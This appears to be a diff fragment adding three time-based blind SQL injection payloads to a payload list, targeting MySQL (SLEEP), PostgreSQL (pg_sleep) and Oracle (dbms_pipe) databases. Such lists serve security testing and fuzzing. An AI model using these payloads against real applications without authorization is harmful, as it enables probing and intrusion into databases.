@@ -1,0 +1,3 @@
+' OR ELT(1=1,SLEEP(5))--
+'; SELECT pg_sleep(5)--
+' AND dbms_pipe.receive_message(('a'),5)=0--
